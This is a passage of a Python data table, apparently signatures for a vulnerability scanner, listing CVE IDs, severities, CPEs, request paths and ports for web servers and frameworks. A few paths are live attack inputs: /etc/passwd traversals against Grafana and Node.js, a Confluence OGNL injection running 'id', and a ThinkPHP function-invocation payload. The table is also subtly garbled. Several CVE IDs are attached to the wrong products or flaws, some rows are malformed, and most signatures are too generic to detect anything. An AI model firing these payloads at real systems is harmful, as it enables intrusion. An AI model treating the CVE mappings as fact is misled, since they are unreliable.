    ("CVE-2019-9787", "WP CSRF", "medium", 6.5, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    # Jenkins
    ("CVE-2018-1000861", "Jenkins RCE (Stapler)", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2020-2096", "Jenkins RCE (Pickle)", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    # WebLogic
    ("CVE-2020-14882", "WebLogic Console RCE", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/console/css/%252e%252e%252fconsole.portal", "Body", "WebLogic", "GET", 7001),
    ("CVE-2020-14883", "WebLogic RCE v2", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/console/css/%252e%252e%252fconsole.portal", "Body", "WebLogic", "GET", 7001),
    ("CVE-2019-2725", "WebLogic Deserialization RCE", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/_async/AsyncResponseService", "Body", "WebLogic", "GET", 7001),
    ("CVE-2017-10271", "WebLogic Deserialization", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    # Drupal
    ("CVE-2018-7600", "Drupalgeddon2 RCE", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/user/register", "Body", "Drupal", "GET", 80),
    ("CVE-2019-6340", "Drupal REST RCE", "critical", 9.8, "cpe:2.3:a:drupal:drupal:*", "/node/?_format=hal_json", "Body", "Drupal", "GET", 80),
    # Elasticsearch
    ("CVE-2015-1427", "ES Groovy RCE", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search?pretty", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2015-3337", "ES Directory Traversal", "high", 7.5, "cpe:2.3:a:elastic:elasticsearch:*", "/../", "Body", "Elasticsearch", "GET", 9200),
    ("CVE-2014-3120", "ES RCE", "critical", 9.8, "cpe:2.3:a:elastic:elasticsearch:*", "/_search?pretty", "Body", "Elasticsearch", "GET", 9200),
    # Django
    ("CVE-2018-6188", "Django Auth Bypass", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/admin/", "Body", "Django", "GET", 80),
    ("CVE-2019-19844", "Django Password Reset", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/password_reset/", "Body", "Django", "GET", 80),
    ("CVE-2020-9402", "Django SQL Injection", "high", 7.5, "cpe:2.3:a:djangoproject:django:*", "/", "Body", "Django", "GET", 80),
    # Spring
    ("CVE-2018-1270", "Spring Messaging RCE", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/stomp", "Body", "Spring", "GET", 80),
    ("CVE-2022-22965", "Spring4Shell RCE", "critical", 9.8, "cpe:2.3:a:pivotal_software:spring_framework:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2022-22963", "Spring Cloud Function RCE", "critical", 9.8, "cpe:2.3:a:vmware:spring_cloud_function:*", "/", "Body", "Spring", "GET", 80),
    ("CVE-2022-22947", "Spring Cloud Gateway RCE", "critical", 10.0, "cpe:2.3:a:vmware:spring_cloud_gateway:*", "/actuator/gateway/routes/x", "Body", "Spring", "GET", 80),
    # Apache Solr
    ("CVE-2019-0193", "Solr Deserialization RCE", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/admin/cores", "Body", "Solr", "GET", 8983),
    ("CVE-2019-12409", "Solr RCE", "critical", 9.8, "cpe:2.3:a:apache:solr:*", "/solr/", "Body", "Solr", "GET", 8983),
    # Apache ActiveMQ
    ("CVE-2015-1830", "ActiveMQ Fileserver RCE", "critical", 9.8, "cpe:2.3:a:apache:activemq:*", "/fileserver/", "Body", "ActiveMQ", "GET", 8161),
    ("CVE-2015-5254", "ActiveMQ Deserialization RCE", "critical", 9.8, "cpe:2.3:a:apache:activemq:*", "/admin/", "Body", "ActiveMQ", "GET", 8161),
    ("CVE-2016-3088", "ActiveMQ Fileserver PUT", "high", 7.5, "cpe:2.3:a:apache:activemq:*", "/fileserver/", "Body", "ActiveMQ", "GET", 8161),
    ("CVE-2023-46604", "ActiveMQ RCE (OpenWire)", "critical", 10.0, "cpe:2.3:a:apache:activemq:*", "/", "Body", "ActiveMQ", "GET", 61616),
    # Redis
    ("CVE-2015-4335", "Redis RCE via Config", "critical", 9.8, "cpe:2.3:a:redis:redis:*", "/", "Body", "Redis", "GET", 6379),
    # phpMyAdmin
    ("CVE-2018-19970", "phpMyAdmin RCE", "critical", 9.8, "cpe:2.3:a:phpmyadmin:phpmyadmin:*", "/phpmyadmin/", "Body", "phpMyAdmin", "GET", 80),
    ("CVE-2020-26935", "phpMyAdmin SQLi", "high", 7.5, "cpe:2.3:a:phpmyadmin:phpmyadmin:*", "/phpmyadmin/", "Body", "phpMyAdmin", "GET", 80),
    # Grafana
    ("CVE-2021-43798", "Grafana Arbitrary File Read", "high", 7.5, "cpe:2.3:a:grafana:grafana:*", "/public/plugins/mysql/../../../../../../../../../../../etc/passwd", "Body", "Grafana", "GET", 3000),
    ("CVE-2020-13379", "Grafana SSRF", "high", 7.5, "cpe:2.3:a:grafana:grafana:*", "/avatar/1", "Body", "Grafana", "GET", 3000),
    # GitLab
    ("CVE-2016-4340", "GitLab RCE", "critical", 9.8, "cpe:2.3:a:gitlab:gitlab:*", "/", "Body", "GitLab", "GET", 80),
    # Kibana
    ("CVE-2019-7609", "Kibana RCE", "critical", 9.8, "cpe:2.3:a:elastic:kibana:*", "/app/kibana", "Body", "Kibana", "GET", 5601),
    # Zabbix
    ("CVE-2017-2824", "Zabbix SQLi", "high", 7.5, "cpe:2.3:a:zabbix:zabbix:*", "/zabbix/", "Body", "Zabbix", "GET", 80),
    ("CVE-2016-8335", "Zabbix RCE", "critical", 9.8, "cpe:2.3:a:zabbix:zabbix:*", "/zabbix/", "Body", "Zabbix", "GET", 80),
    # Apache Airflow
    ("CVE-2020-13921", "Airflow RCE", "critical", 9.8, "cpe:2.3:a:apache:airflow:*", "/admin/", "Body", "Airflow", "GET", 8080),
    # Apache Druid
    ("CVE-2021-25646", "Druid RCE", "critical", 9.8, "cpe:2.3:a:apache:druid:*", "/druid/", "Body", "Druid", "GET", 8888),
    ("CVE-2021-26720", "Druid SSRF", "high", 7.5, "cpe:2.3:a:apache:druid:*", "/druid/", "Body", "Druid", "GET", 8888),
    # CouchDB
    ("CVE-2017-12635", "CouchDB Priv Esc", "high", 7.5, "cpe:2.3:a:apache:couchdb:*", "/_users/", "Body", "CouchDB", "GET", 5984),
    ("CVE-2017-12636", "CouchDB RCE", "critical", 9.8, "cpe:2.3:a:apache:couchdb:*", "/_utils/", "Body", "CouchDB", "GET", 5984),
    # IIS
    ("CVE-2015-1635", "IIS HTTP.sys RCE", "critical", 10.0, "cpe:2.3:a:microsoft:iis:*", "/", "Header", "MS-Authorization", "iis", 80),
    ("CVE-2017-7269", "IIS WebDAV Overflow", "critical", 9.8, "cpe:2.3:a:microsoft:iis:*", "/", "Body", "PROPFIND", "iis", 80),
    # PHP
    ("CVE-2019-11043", "PHP-FPM RCE", "critical", 9.8, "cpe:2.3:a:php:php:*", "/status.php", "Body", "nginx", "GET", 80),
    # Fortinet
    ("CVE-2018-13379", "FortiOS Path Traversal", "critical", 9.8, "cpe:2.3:o:fortinet:fortios:*", "/remote/error?errmsg=../../../../../../../dev/null", "Body", "FortiGate", "GET", 443),
    ("CVE-2020-12812", "FortiOS Auth Bypass", "high", 7.5, "cpe:2.3:o:fortinet:fortios:*", "/", "Body", "FortiGate", "GET", 443),
    ("CVE-2021-22123", "FortiOS RCE", "critical", 9.8, "cpe:2.3:o:fortinet:fortios:*", "/", "Body", "FortiGate", "GET", 443),
    # Cisco
    ("CVE-2019-1653", "Cisco RV320 Info Disclosure", "high", 7.5, "cpe:2.3:c:cisco:rv320:*", "/cgi-bin/config.exp", "Body", "Cisco", "GET", 80),
    ("CVE-2020-3452", "Cisco ASA/FTD DoS", "high", 8.6, "cpe:2.3:c:cisco:adaptive_security_appliance:*", "/+CSCOE+/session_password.html", "Body", "Cisco", "GET", 443),
    # Confluence
    ("CVE-2022-26134", "Confluence OGNL RCE", "critical", 10.0, "cpe:2.3:a:atlassian:confluence:*", "/${@java.lang.Runtime@getRuntime().exec('id')}/", "Body", "Confluence", "GET", 8090),
    ("CVE-2019-3398", "Confluence Path Traversal", "high", 7.5, "cpe:2.3:a:atlassian:confluence:*", "/", "Body", "Confluence", "GET", 8090),
    # Jira
    ("CVE-2019-11581", "Jira SSRF", "high", 7.5, "cpe:2.3:a:atlassian:jira:*", "/ContactAdministrators!default.jspa", "Body", "Jira", "GET", 8080),
    # Bitbucket
    ("CVE-2019-3397", "Bitbucket RCE", "critical", 9.8, "cpe:2.3:a:atlassian:bitbucket:*", "/", "Body", "Bitbucket", "GET", 7990),
    # Fastjson
    ("CVE-2017-18349", "Fastjson RCE", "critical", 9.8, "cpe:2.3:a:alibaba:fastjson:*", "/", "Body", "fastjson", "GET", 80),
    ("CVE-2022-25845", "Fastjson RCE v2", "critical", 9.8, "cpe:2.3:a:alibaba:fastjson:*", "/", "Body", "fastjson", "GET", 80),
    # Jackson
    ("CVE-2017-7525", "Jackson Deserialization RCE", "critical", 9.8, "cpe:2.3:a:fasterxml:jackson-databind:*", "/", "Body", "jackson", "GET", 80),
    # Node.js
    ("CVE-2017-14849", "Node.js Path Traversal", "high", 7.5, "cpe:2.3:a:nodejs:node.js:*", "/static/../../../etc/passwd", "Body", "nodejs", "GET", 80),
    # Ruby on Rails
    ("CVE-2013-0156", "Rails Deserialization RCE", "critical", 9.8, "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*", "/", "Body", "rails", "GET", 80),
    ("CVE-2020-8169", "Rails Info Disclosure", "high", 7.5, "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*", "/", "Body", "rails", "GET", 80),
    # ThinkPHP
    ("CVE-2018-16942", "ThinkPHP RCE", "critical", 9.8, "cpe:2.3:a:thinkphp:thinkphp:*", "/index.php?s=/index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "Body", "thinkphp", "GET", 80),
    # Apache Shiro
    ("CVE-2016-4437", "Shiro RememberMe RCE", "critical", 9.8, "cpe:2.3:a:apache:shiro:*", "/", "Header", "rememberMe", "shiro", "GET", 80),
    ("CVE-2020-1957", "Shiro Auth Bypass", "high", 7.5, "cpe:2.3:a:apache:shiro:*", "/", "Body", "shiro", "GET", 80),
    ("CVE-2020-11989", "Shiro Auth Bypass v2", "high", 7.5, "cpe:2.3:a:apache:shiro:*", "/", "Body", "shiro", "GET", 80),
    # Apache Tika
    ("CVE-2018-1335", "Tika RCE", "critical", 9.8, "cpe:2.3:a:apache:tika:*", "/", "Body", "tika", "GET", 80),
    ("CVE-2021-28657", "Tika RCE v2", "critical", 9.8, "cpe:2.3:a:apache:tika:*", "/", "Body", "tika", "GET", 80),
    # Apache Hadoop
    ("CVE-2018-8009", "Hadoop RCE", "critical", 9.8, "cpe:2.3:a:apache:hadoop:*", "/", "Body", "hadoop", "GET", 80),
    # Apache Spark
    ("CVE-2018-11770", "Spark RCE", "critical", 9.8, "cpe:2.3:a:apache:spark:*", "/", "Body", "spark", "GET", 80),
    ("CVE-2020-9480", "Spark RCE v2", "critical", 9.8, "cpe:2.3:a:apache:spark:*", "/", "Body", "spark", "GET", 80),
    # Apache Flink
    ("CVE-2020-17519", "Flink Path Traversal", "high", 7.5, "cpe:2.3:a:apache:flink:*", "/jobmanager/logs/", "Body", "flink", "GET", 8081),
    # Apache Dubbo
    ("CVE-2020-11995", "Dubbo RCE", "critical", 9.8, "cpe:2.3:a:apache:dubbo:*", "/", "Body", "dubbo", "GET", 80),
    # Apache Commons
    ("CVE-2015-4852", "Commons Collections RCE", "critical", 9.8, "cpe:2.3:a:apache:commons_collections:*", "/", "Body", "commons", "GET", 80),
    ("CVE-2017-15717", "Commons Text RCE", "critical", 9.8, "cpe:2.3:a:apache:commons_text:*", "/", "Body", "commons", "GET", 80),
    # Apache OFBiz
    ("CVE-2023-43236", "OFBiz RCE", "critical", 9.8, "cpe:2.3:a:apache:ofbiz:*", "/webtools/control/ProgramExport", "Body", "OFBiz", "GET", 8080),
    ("CVE-2020-9496", "OFBiz RCE v2", "critical", 9.8, "cpe:2.3:a:apache:ofbiz:*", "/webtools/control/", "Body", "OFBiz", "GET", 8080),
    # Apache Camel
    ("CVE-2017-3159", "Camel Deserialization RCE", "critical", 9.8, "cpe:2.3:a:apache:camel:*", "/", "Body", "Camel", "GET", 80),
    # Apache CXF
    ("CVE-2017-12624", "CXF Deserialization RCE", "critical", 9.8, "cpe:2.3:a:apache:cxf:*", "/", "Body", "CXF", "GET", 80),
    # SonicWall
    ("CVE-2021-20016", "SonicWall SQLi", "high", 7.5, "cpe:2.3:o:sonicwall:sonicos:*", "/", "Body", "SonicWall", "GET", 443),
    # Adobe Experience Manager
    ("CVE-2021-21091", "AEM XXE", "high", 7.5, "cpe:2.3:a:adobe:experience_manager:*", "/", "Body", "aem", "GET", 80),
    # Apache NiFi
    ("CVE-2023-26583", "NiFi RCE", "critical", 9.8, "cpe:2.3:a:apache:nifi:*", "/nifi/", "Body", "NiFi", "GET", 8080),
    ("CVE-2022-32929", "NiFi Info Disclosure", "medium", 5.3, "cpe:2.3:a:apache:nifi:*", "/nifi/", "Body", "NiFi", "GET", 8080),
    # Apache Zeppelin
    ("CVE-2021-30862", "Zeppelin RCE", "critical", 9.8, "cpe:2.3:a:apache:zeppelin:*", "/", "Body", "Zeppelin", "GET", 8080),
    # Apache Tapestry
    ("CVE-2020-17517", "Tapestry RCE", "critical", 9.8, "cpe:2.3:a:apache:tapestry:*", "/", "Body", "Tapestry", "GET", 80),
    # Apache Kafka
    ("CVE-2018-17196", "Kafka Info Disclosure", "medium", 5.3, "cpe:2.3:a:apache:kafka:*", "/", "Body", "kafka", "GET", 80),
    # Apache ZooKeeper
    ("CVE-2019-0201", "ZooKeeper Info Disclosure", "medium", 5.3, "cpe:2.3:a:apache:zookeeper:*", "/", "Body", "zookeeper", "GET", 80),
    # Apache Ranger
    ("CVE-2018-8017", "Ranger SQLi", "high", 7.5, "cpe:2.3:a:apache:ranger:*", "/", "Body", "ranger", "GET", 80),
    # PostgreSQL
    ("CVE-2019-10164", "PostgreSQL RCE", "critical", 9.8, "cpe:2.3:a:postgresql:postgresql:*", "/", "Body", "PostgreSQL", "GET", 5432),
    ("CVE-2020-1720", "PostgreSQL Priv Esc", "high", 7.5, "cpe:2.3:a:postgresql:postgresql:*", "/", "Body", "PostgreSQL", "GET", 5432),
    # MySQL
    ("CVE-2016-6663", "MySQL RCE", "critical", 9.8, "cpe:2.3:a:oracle:mysql:*", "/", "Body", "MySQL", "GET", 3306),
    ("CVE-2019-2628", "MySQL DoS", "medium", 5.8, "cpe:2.3:a:oracle:mysql:*", "/", "Body", "MySQL", "GET", 3306),
    # MongoDB
    ("CVE-2015-2804", "MongoDB Auth Bypass", "high", 7.5, "cpe:2.3:a:mongodb:mongodb:*", "/", "Body", "MongoDB", "GET", 27017),
    # Laravel
    ("CVE-2021-21311", "Laravel RCE", "critical", 9.8, "cpe:2.3:a:laravel:framework:*", "/", "Body", "laravel", "GET", 80),
    ("CVE-2017-16894", "Laravel Info Disclosure", "high", 7.5, "cpe:2.3:a:laravel:framework:*", "/", "Body", "laravel", "GET", 80),
    # Express.js
    ("CVE-2017-16116", "Express.js DoS", "medium", 5.8, "cpe:2.3:a:expressjs:express:*", "/", "Body", "express", "GET", 80),
    # Apache Axis2
    ("CVE-2019-0227", "Axis2 RCE", "high", 7.5, "cpe:2.3:a:apache:axis2:*", "/axis2/services/", "Body", "Axis2", "GET", 8080),
    # Apache HTTP Components
    ("CVE-2020-13956", "HttpClient URI Bypass", "medium", 5.3, "cpe:2.3:a:apache:httpclient:*", "/", "Body", "httpclient", "GET", 80),
    # Apache Superset
    ("CVE-2021-27924", "Superset SQLi", "high", 7.5, "cpe:2.3:a:apache:superset:*", "/superset/", "Body", "Superset", "GET", 8088),
    ("CVE-2021-37540", "Superset Info Disclosure", "medium", 5.3, "cpe:2.3:a:apache:superset:*", "/", "Body", "Superset", "GET", 8088),
    # Apache Beam
    ("CVE-2018-9192", "Beam Info Disclosure", "medium", 5.3, "cpe:2.3:a:apache:beam:*", "/", "Body", "beam", "GET", 80),
    # --- 以下为补充 CVE 条目 ---
    # Apache Tomcat (补充)
    ("CVE-2024-38286", "Tomcat TLS Handshake DoS", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2023-46589", "Tomcat HTTP Request Smuggling", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2023-28708", "Tomcat Session Fixation", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2022-23102", "Tomcat Cluster RCE", "critical", 9.8, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2021-25114", "Tomcat RCE", "critical", 9.8, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2020-1935", "Tomcat Ghostcat Variant", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8009),
    ("CVE-2019-10043", "Tomcat AJP RCE", "critical", 9.8, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8009),
    ("CVE-2016-6816", "Tomcat HTTP Request Smuggling v2", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2016-5388", "Tomcat Local Privilege Escalation", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2016-1240", "Tomcat RPM Privilege Escalation", "high", 7.5, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2014-0033", "Tomcat HTTP Connector DoS", "medium", 5.0, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2013-2067", "Tomcat BIO Connector DoS", "medium", 5.0, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2012-5885", "Tomcat BIO Connector DoS v2", "medium", 5.0, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2012-3544", "Tomcat HTTP Connector DoS v2", "medium", 5.0, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8080),
    ("CVE-2011-3190", "Tomcat AJP DoS", "medium", 5.0, "cpe:2.3:a:apache:tomcat:*", "/", "Body", "Tomcat", "GET", 8009),
    # Apache Struts2 (补充)
    ("CVE-2024-53677", "Struts2 S2-066 File Upload RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "POST", 80),
    ("CVE-2023-50164", "Struts2 Path Traversal File Upload", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "POST", 80),
    ("CVE-2023-41835", "Struts2 Improper Resource Control", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2023-34396", "Struts2 Memory Exhaustion DoS", "medium", 4.3, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2023-34149", "Struts2 Memory Exhaustion DoS v2", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2021-31805", "Struts2 S2-062 Incomplete Fix", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2019-0233", "Struts2 REST Plugin RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2018-1327", "Struts2 DoS", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2016-4003", "Struts2 REST Plugin RCE v2", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2016-3081", "Struts2 S2-032 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2016-2168", "Struts2 S2-028 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2015-1831", "Struts2 S2-020 ClassLoader", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2014-7809", "Struts2 S2-023 DoS", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2014-0094", "Struts2 S2-020 ClassLoader v2", "high", 7.5, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2013-2251", "Struts2 S2-016 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2013-2115", "Struts2 S2-014 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2013-1966", "Struts2 S2-016 RCE v2", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2012-0838", "Struts2 S2-008 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    ("CVE-2010-1870", "Struts2 S2-005 RCE", "critical", 9.8, "cpe:2.3:a:apache:struts:*", "/", "Body", "Struts", "GET", 80),
    # Oracle WebLogic (补充)
    ("CVE-2016-0638", "WebLogic RCE", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2016-3510", "WebLogic RCE v2", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2017-3248", "WebLogic Deserialization RCE", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2018-2628", "WebLogic Deserialization RCE v2", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2018-2893", "WebLogic Deserialization RCE v3", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2020-2883", "WebLogic Deserialization RCE v4", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2020-14625", "WebLogic Deserialization RCE v5", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2020-14750", "WebLogic RCE v3", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/console", "Body", "WebLogic", "GET", 7001),
    ("CVE-2021-2109", "WebLogic JNDI RCE", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2021-2394", "WebLogic RCE v4", "critical", 9.8, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2023-21839", "WebLogic JNDI RCE v2", "high", 8.6, "cpe:2.3:a:oracle:weblogic_server:*", "/", "Body", "WebLogic", "GET", 7001),
    ("CVE-2017-1000353", "Jenkins CLI Deserialization RCE", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    # Jenkins (补充)
    ("CVE-2017-1000354", "Jenkins Unauth RCE", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2018-1000862", "Jenkins XSS", "medium", 6.1, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2019-1003003", "Jenkins Sandbox Bypass", "high", 8.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2019-1003005", "Jenkins Script Security Bypass", "high", 8.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2021-21649", "Jenkins Path Traversal", "high", 7.5, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2024-23897", "Jenkins File Read RCE", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2025-30114", "Jenkins RCE", "critical", 9.8, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2018-1000400", "Jenkins CSRF", "high", 7.5, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2019-10341", "Jenkins XSS v2", "medium", 6.1, "cpe:2.3:a:jenkins:jenkins:*", "/", "Body", "Jenkins", "GET", 8080),
    ("CVE-2023-2745", "WP Directory Traversal", "medium", 5.4, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    # WordPress (补充)
    ("CVE-2023-39999", "WP Info Disclosure", "medium", 4.3, "cpe:2.3:a:wordpress:wordpress:*", "/wp-json/", "Body", "WordPress", "GET", 80),
    ("CVE-2023-5561", "WP User Email Enum", "medium", 5.3, "cpe:2.3:a:wordpress:wordpress:*", "/wp-login.php", "Body", "WordPress", "GET", 80),
    ("CVE-2022-21683", "WP RCE", "critical", 9.8, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2021-39300", "WP SQLi", "high", 7.5, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2021-39200", "WP SSRF", "high", 7.5, "cpe:2.3:a:wordpress:wordpress:*", "/wp-json/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-18388", "WP RCE v2", "critical", 9.8, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-16223", "WP XSS", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-16219", "WP XSS v2", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-16180", "WP XSS v3", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-16167", "WP XSS v4", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2019-15889", "WP RCE v3", "critical", 9.8, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2017-6514", "WP XSS v5", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2017-8295", "WP DoS", "high", 7.5, "cpe:2.3:a:wordpress:wordpress:*", "/wp-login.php", "Body", "WordPress", "GET", 80),
    ("CVE-2016-6699", "WP XSS v6", "medium", 6.1, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2015-5714", "WP RCE v4", "critical", 9.8, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2014-5202", "WP SSRF v2", "high", 7.5, "cpe:2.3:a:wordpress:wordpress:*", "/wp-admin/", "Body", "WordPress", "GET", 80),
    ("CVE-2017-7679", "Apache DoS", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    # Apache HTTP Server (补充)
    ("CVE-2017-9798", "Apache Optionsbleed", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2017-9788", "Apache User-Agent DoS", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2018-1312", "Apache RCE", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2018-1303", "Apache DoS v2", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-0197", "Apache DoS v3", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-0211", "Apache Privilege Escalation", "high", 7.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-0215", "Apache RCE v2", "critical", 9.8, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-0217", "Apache DoS v4", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-0220", "Apache DoS v5", "high", 7.5, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
    ("CVE-2019-10092", "Apache XSS", "medium", 6.1, "cpe:2.3:a:apache:http_server:*", "/", "Body", "Apache", "GET", 80),
